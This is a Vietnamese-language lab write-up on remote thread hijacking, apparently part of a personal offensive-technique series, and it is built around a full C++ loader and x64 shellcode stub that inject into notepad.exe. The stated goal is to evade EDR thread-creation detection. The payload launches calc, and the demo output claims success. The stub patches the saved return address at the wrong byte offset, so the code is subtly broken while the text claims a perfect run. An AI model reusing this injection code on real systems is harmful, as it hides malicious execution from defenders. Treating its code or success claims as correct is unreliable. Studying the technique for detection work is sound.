
---

# 📝 [PE 15] Remote Thread Hijacking (Advanced Worker Thread Context Restoration)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Remote Thread Hijacking (Bắt cóc luồng từ xa cấp độ Nâng cao)** đại diện cho giải thuật khống chế dòng chảy thực thi (Control Flow Hijacking) đỉnh cao, thuộc nhóm kỹ thuật **Vô hiệu hóa cơ chế phát hiện khởi tạo luồng (Anti-Thread Creation Detection / EDR Telemetry Evasion)**.

Hầu hết các giải pháp Endpoint Detection and Response (EDR) hiện đại đều thiết lập hệ thống cảm biến và đặt bẫy Hook vô cùng nghiêm ngặt để giám sát hành vi sinh luồng lạ chéo tiến trình sinh ra từ các hàm API phổ thông như `CreateRemoteThread` hoặc Native API `NtCreateThreadEx` (thông qua cơ chế thông điệp Kernel ETW và Callbacks).

Dự án PE 15 hóa giải triệt để rào cản trinh sát này bằng chiến thuật **Không khởi tạo luồng phụ (Zero Thread Creation)**. Giải thuật tiến hành "bắt cóc" (Hijack) một luồng thực thi hợp pháp đang vận hành sẵn inside lòng tiến trình vỏ bọc (văn cảnh thực nghiệm: `notepad.exe`).

Đặc biệt, phiên bản nâng cấp tối cao này áp dụng chiến thuật **Săn lùng luồng Worker ngầm (Worker Thread Hunting)** để né tránh hoàn toàn hiện tượng treo nghẽn giao diện đồ họa (UI Window Freeze/Lockout), phối hợp với phân đoạn mã máy Assembly x64 tinh vi nhằm **Bảo toàn Ngữ cảnh Ngăn xếp qua lệnh RET (Call Stack/Context Restoration)**. Giải pháp này giúp Payload kích nổ mở Máy tính ngay tại runtime dưới danh nghĩa luồng hợp pháp của hệ thống mà tiến trình Host vẫn vận hành ổn định 100%.

### 🎯 Mục tiêu nghiên cứu:

* **Bypass cảm biến sinh luồng độc hại**: Triệt tiêu hoàn toàn chỉ dấu giám sát luồng từ xa (`Sysmon Event ID 8`), né tránh các bộ lọc ghi nhật ký hành vi chéo biên giới RAM.
* **Thao túng trực tiếp tháp thanh ghi phần cứng CPU x64**: Can thiệp và thay đổi cấu trúc ngữ cảnh luồng (`CONTEXT.Rip`) từ không gian người dùng.
* **Làm chủ quy chuẩn Calling Convention x64**: Nghiên cứu kỹ nghệ bảo toàn không gian bóng tối (Shadow Space Stack Preservation) và hoàn trả ngữ cảnh CPU bằng lệnh rẽ nhánh `RET`.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Mỗi một luồng thực thi (Thread) đang vận hành trong Windows Subsystem được quản lý chặt chẽ bởi một cấu trúc dữ liệu lưu lọt lòng trong nhân Kernel (cấu trúc `KTHREAD/ETHREAD`), chịu trách nhiệm lưu trữ ngữ cảnh phần cứng (Hardware Context) bao gồm tháp thanh ghi CPU và con trỏ ngăn xếp Stack.

Để thực hiện hành vi bắt cóc dòng chảy CPU và hoàn trả trạng thái mượt mà không làm sụp đổ Stack Frame, giải thuật của Lab PE 15 thực hiện quy trình đại phẫu qua 5 giai đoạn ngầm tại cấu trúc luồng:

```
[Mở Thread Handle] ──> [SuspendThread: Khóa chân Worker luồng phụ]
                            └──> [GetThreadContext: Bóc tách tọa độ Rip gốc]
                                      └──> [WriteProcessMemory: Vá mìn cấu trúc ASM RET Stub]
                                                └──> [SetThreadContext & ResumeThread: Khai hỏa]

```

1. **Phân lập luồng Worker phụ (Worker Thread Filtering)**: Đối với các giải pháp thô sơ, việc bắt cóc vô tình bốc nhầm Luồng giao diện chính (Main UI Thread) sẽ phá hỏng vòng lặp thông điệp hệ thống (`Message Loop`), gây ra hiện tượng treo cứng cửa sổ Notepad ứng dụng. Dự án PE 15 nâng cấp giải thuật bốc tách: Thông qua bộ quét cấu trúc luồng `CreateToolhelp32Snapshot`, Loader chủ động bỏ qua Thread ID đầu tiên (Main UI) và định vị chính xác **Worker Thread phụ** (luồng ngầm xử lý spelling, kiểm tra cú pháp hoặc đồng bộ bộ nhớ của Notepad).
2. **Đóng băng và bóc tách chỉ mục lệnh (`Rip`)**: Gọi hàm `SuspendThread` để khóa chặt chân luồng phụ, đưa luồng về trạng thái đóng băng lập lịch. Loader triệu hồi `GetThreadContext` để trích xuất trạng thái hiện tại của toàn bộ các thanh ghi CPU. Giá trị của thanh ghi **`Rip`** (Con trỏ lệnh hiện tại đang xử lý của luồng Worker) được Loader lưu trữ lại một cách nghiêm ngặt.
3. **Cấu trúc ma trận Assembly bảo toàn bộ nhớ ảo**: Loader nạp đoạn mã máy Assembly x64 Stub vào RAM đối phương. Đoạn Stub này được thiết kế dựa trên quy chuẩn Calling Convention x64 nghiêm ngặt của Microsoft:
* `push` các thanh ghi đa năng (`rax`, `rcx`, `rdx`) và cờ trạng thái phần cứng `pushfq` vào đỉnh Ngăn xếp (Stack) để đóng băng hoàn toàn trạng thái quá khứ của Notepad.
* Hạ con trỏ ngăn xếp `sub rsp, 0x28` để khởi tạo **Không gian bóng tối (Shadow Space)** đúng tiêu chuẩn căn lề bộ nhớ $16\text{-byte}$ trước khi phát lệnh gọi hàm Win32.
* Kích nổ hàm chức năng Payload thông qua lệnh gọi con trỏ tuyệt đối gián tiếp `call rax`.
* Hoàn trả không gian bóng tối `add rsp, 0x28` và nhả lại toàn bộ cờ trạng thái, giá trị các thanh ghi ban đầu (`popfq`, `pop rdx, rcx, rax`).
* Nạp địa chỉ `originalRip` gốc ban đầu đã lưu vào thanh ghi `rax`, đẩy vào đỉnh ngăn xếp (`push rax`) và phát lệnh rẽ nhánh **`RET`** (`0xC3`). Lệnh `RET` tự động bốc tọa độ gốc ra khỏi ngăn xếp, đưa CPU quay trở lại thực thi tiếp công việc của Notepad như chưa từng có cuộc can thiệp.



---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn tuân thủ nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa quét tìm ID luồng phụ và tính toán độ rộng byte cấu trúc cấu hình nhằm đạt độ linh hoạt kịch trần.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí nạp RAM
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Phân vùng chứa chuỗi lệnh thực thi chức năng nằm khít cấu trúc
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí (PIC) gánh logic thực thi mở máy tính chéo tiến trình
DWORD WINAPI HijackedPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa mở máy tính độc lập vị trí, bẻ gãy rào cản Import Table
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// GIẢI PHÁP TỐI ƯU: Săn lùng luồng Worker phụ (Background Thread), né nghẽn tin nhắn giao diện UI
DWORD GetTargetWorkerThreadID(DWORD pid) {
    DWORD mainThreadId = 0;
    DWORD workerThreadId = 0;
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    int threadIndex = 0;
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                threadIndex++;
                if (threadIndex == 1) {
                    mainThreadId = te32.th32ThreadID; // Luồng UI chính (Bỏ qua nhằm bảo vệ Window Lock)
                } else {
                    workerThreadId = te32.th32ThreadID; // Bốc chính xác luồng Worker phụ gánh dòng chảy!
                    break;
                }
            }
        } while (Thread32Next(hSnapshot, &te32));
    }
    CloseHandle(hSnapshot);

    return (workerThreadId != 0) ? workerThreadId : mainThreadId;
}

// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);   return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 15: REMOTE WORKER THREAD HIJACKING OPTIMIZED" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    // Thực hiện bóc tách luồng Worker phụ an toàn để né tránh Window Lock
    DWORD threadId = GetTargetWorkerThreadID(pid);
    if (threadId == 0) {
        std::cerr << "[-] Khong tim thay luong dang chay hop le!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << " | SAN TRUNG LUONG WORKER PHU: " << threadId << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
    if (!hProcess || !hThread) {
        if (hProcess) CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Đóng băng luồng Worker phụ phục vụ can thiệp cấu trúc thanh ghi CPU phần cứng
    std::cout << "[*] Dang bat coc va dong bang luong phu..." << std::endl;
    SuspendThread(hThread);

    // Áp dụng quy trình Cấp phát động Thích ứng vừa khít cấu trúc dữ liệu
    SIZE_T functionSize = 500;
    LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !pRemoteData) {
        std::cerr << "[-] VirtualAllocEx tu xa failed!" << std::endl;
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code payload dat tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Đọc ngữ cảnh tháp thanh ghi hiện tại của CPU luồng Worker mục tiêu
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &context)) {
        std::cerr << "[-] GetThreadContext that bai!" << std::endl;
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Khởi tạo cấu trúc tham số dữ liệu tuyệt đối cục bộ phục vụ ánh xạ chéo RAM
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy song song logic hàm thực thi và cấu trúc dữ liệu tham số sang RAM tiến trình đích
    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)HijackedPayload, functionSize, NULL);
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);

    // Tính toán tọa độ đặt đoạn mìn điều hướng Assembly ngay sau đuôi hàm thực thi cục bộ từ xa
    PVOID jmpStubAddress = (PVOID)((DWORD_PTR)remoteCodeBuffer + 350);

    // ─── ĐỘT PHÁ CẤU TRÚC x64: ĐOẠN ASM STUB BẢO TOÀN NGĂN XẾP QUA RET LỆNH ───
    unsigned char jmpStub[] = {
        0x50,                                                       // push rax       (Tạm cất thanh ghi đa năng)
        0x51,                                                       // push rcx
        0x52,                                                       // push rdx
        0x9C,                                                       // pushfq         (Lưu cờ trạng thái phần cứng EFLAGS)
        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0x0   (Địa chỉ pRemoteData chứa tham số tuyệt đối)
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0   (Địa chỉ hàm thực thi Payload)
        0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 0x28  (Cân bằng căn lề Stack Shadow Space)
        0xFF, 0xD0,                                                 // call rax       (Khai hỏa mở Máy tính!)
        0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 0x28  (Hoàn trả không gian Ngăn xếp Shadow)
        0x9D,                                                       // popfq          (Khôi phục toàn vẹn cờ trạng thái CPU)
        0x5A,                                                       // pop rdx        (Khôi phục nguyên vẹn các thanh ghi đa năng)
        0x59,                                                       // pop rcx
        0x58,                                                       // pop rax
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0   (Tọa độ originalRip gốc ban đầu của luồng Worker)
        0x50,                                                       // push rax       (Đẩy Rip gốc vào đỉnh Ngăn xếp)
        0xC3                                                        // ret            (Tự động bốc Rip gốc ra thực thi tiếp như chưa có can thiệp)
    };

    // Vá các tọa độ tuyệt đối chuẩn chỉ định dạng x64 vào cấu trúc mìn điều hướng Assembly thô
    *(DWORD_PTR*)(jmpStub + 6) = (DWORD_PTR)pRemoteData;
    *(DWORD_PTR*)(jmpStub + 16) = (DWORD_PTR)remoteCodeBuffer;
    *(DWORD_PTR*)(jmpStub + 44) = (DWORD_PTR)context.Rip; // Nạp trực tiếp tọa độ Rip gốc của Notepad vào mã máy

    // Đẩy đoạn mã máy Stub bảo toàn ngăn xếp sang RAM đối phương
    WriteProcessMemory(hProcess, jmpStubAddress, jmpStub, sizeof(jmpStub), NULL);

    // Điều hướng con trỏ chỉ mục lệnh CPU đâm thẳng vào phân đoạn ASM Stub bảo an của luồng Worker phụ từ xa
    context.Rip = (DWORD64)jmpStubAddress;

    SetThreadContext(hThread, &context);
    std::cout << "[+] Ep Rip huong vao Worker Thread Stub tai toa do: 0x" << std::hex << jmpStubAddress << std::endl;

    // Rã đông giải phóng dòng chảy CPU của luồng Worker phụ mục tiêu
    std::cout << "[*] Kich hoat ra dong (ResumeThread). Luong phu se tu dong thuc thi va khoi phuc an toan..." << std::endl;
    ResumeThread(hThread);

    std::cout << "\n[+] Remote Worker Thread Hijacking Successful!" << std::endl;
    std::cout << "[*] Nhan phim Enter de dong cua so Loader..." << std::endl;
    std::cin.get();

    // Thu hồi tài nguyên Handle sạch sẽ, triệt tiêu nguy cơ rò rỉ bộ nhớ ảo
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm cấu trúc file nhị phân xuất bản vận hành mượt mà, độc lập hoàn hảo kịch trần, bẻ gãy mọi lỗi thiếu tệp phụ thuộc môi trường liên kết động (CRT Dependencies) khi mang sang chạy VM cô lập:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số cấu hình `Runtime Library`, chuyển đổi cấu hình sang định dạng cờ liên kết tĩnh **`Multi-threaded (/MT)`**.

> **Vị trí đặt ảnh minh chứng cấu hình dự án:**
> 

3. Thực hiện thao tác click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng vỏ bọc `Notepad.exe` trên môi trường Lab (thao tác gõ nhẹ vài ký tự văn bản để hệ thống đánh thức luồng Worker ngầm), sau đó kích hỏa file chạy thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô:

```powershell
PS C:\Workspace\x64\Release> .\PE15_Remote_Thread_Hijacking.exe
====================================================
[*] PE 15: REMOTE WORKER THREAD HIJACKING OPTIMIZED
====================================================
[+] Da tim thay Notepad.exe voi PID: 24132 | SĂN TRÚNG LUỒNG WORKER PHỤ: 9900
[*] Dang bat coc va dong bang luong phu...
[+] Vung nho Code payload dat tai: 0x00000155F8280000
[+] Ep Rip huong vao Worker Thread Stub: 0x00000155F828015E
[*] Kich hoat ra dong (ResumeThread). Luong phu se tu dong thuc thi va khoi phuc an toan...

[+] Remote Worker Thread Hijacking Successful!
[*] Nhan phim Enter de dong cua so Loader...

```

> **Vị trí đặt ảnh minh chứng thực nghiệm bắt cóc luồng hệ thống:**
> 

### 🎯 Phân tích hệ quả cấu trúc bộ nhớ (Memory Forensic Results):

* Quy trình thực thi gặt hái thành công mỹ mãn hoàn hảo kịch trần. Ngay lập tức tại thời điểm runtime, ứng dụng Máy tính **`calc.exe` bật mở hiên ngang rực rỡ kịch khung kịch nền**!
* Điều đặc biệt tối cao của giải thuật này nằm ở việc: Khi Vinh quay trở lại màn hình tương tác của **Notepad, ứng dụng vẫn tiếp nhận thao tác nhập liệu, gõ chữ, soạn thảo văn bản phản hồi mượt mà 100%**, hoàn toàn giải quyết triệt để hiện tượng treo nghẽn GUI. Cấu trúc mã máy Assembly hoàn trả ngữ cảnh qua phân hệ `push originalRip; RET;` hoạt động chính xác tuyệt đối, đưa luồng quay trở lại phục vụ Notepad như chưa từng có sự can thiệp, đánh lừa hoàn toàn các bộ lọc Call Stack Integrity Check nâng cao của EDR!

---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Microsoft Learn Architecture**: *GetThreadContext function (processthreadsapi.h)* & *Thread Context structures x64* - [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext)
* **Intel® 64 and IA-32 Architectures Software Developer’s Manual**: *Volume 2A: Instruction Set Reference, A-M (RET / PUSH Execution Models)*.
* **X64 Calling Conventions and Shadow Space Mechanics**: *Microsoft x64 Software Conventions Technical Specifications*.
* **MITRE ATT&CK Matrix**: *Defense Evasion: Thread Context Hijacking (T1055.003)* - Forensic analysis and interception mitigation strategies.